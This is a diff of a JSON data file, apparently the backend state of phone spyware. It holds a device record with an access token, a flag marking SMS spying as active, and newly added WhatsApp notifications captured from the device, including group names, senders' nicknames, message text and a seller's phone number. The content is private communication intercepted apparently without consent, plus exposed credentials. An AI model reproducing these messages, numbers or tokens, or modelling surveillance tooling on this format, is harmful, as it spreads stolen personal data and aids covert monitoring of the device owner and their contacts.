@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777173352361,
+    "lastSeen": 1777173359247,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "📡 Undangan admin saluran",
+        "time": "26/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173361507
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎[𝐃𝐖𝐁] 𝐃𝐀𝐄𝐑𝐀𝐇 𝐖𝐎𝐍𝐆 𝐁𝐀𝐂𝐎𝐓 || 𝐍𝐄𝐖 𝐄𝐑𝐀 (108 pesan): ~ pia?",
+        "content": "knco asu aku dicecoki😭",
+        "time": "26/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173353518
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (181 pesan): ~ rafi ahmad",
+        "content": "king blunder",
+        "time": "26/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173353283
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOK AXEL 17 STR #1 (50 pesan): ~ ARM STORE [7855]",
+        "content": "📷 FORMAT JUAL/CARI BY ARM STORE\n[BUKAN ADMIN YG NEED/JUAL]\nJual / Cari:jual\nHarga:120inc\nLog: bind \nSpek:liat\nMc : ARM STORE [JANGAN DI GANTI]\nNomer:085781370489\n\nWajib Menggunakan Mc ARM STORE Biar Terhindar Dari Penipuan",
+        "time": "26/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173353086
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (140 pesan): ~ petani ngawi",
+        "content": "📷 ‎‎2 foto, ‎1 video",
+        "time": "26/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173352934
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐉𝐁 𝟏  || 𝐊𝐈𝐍𝐆 𝐕𝐀𝐋𝐙  ✨ (95 pesan): ~ Hudzz Sturee",
+        "content": "📷 op?30+ gb+sl angkut sumua mc/direct bebas",
+        "time": "26/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173352892
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (98 pesan): ~ jiermeii😳",
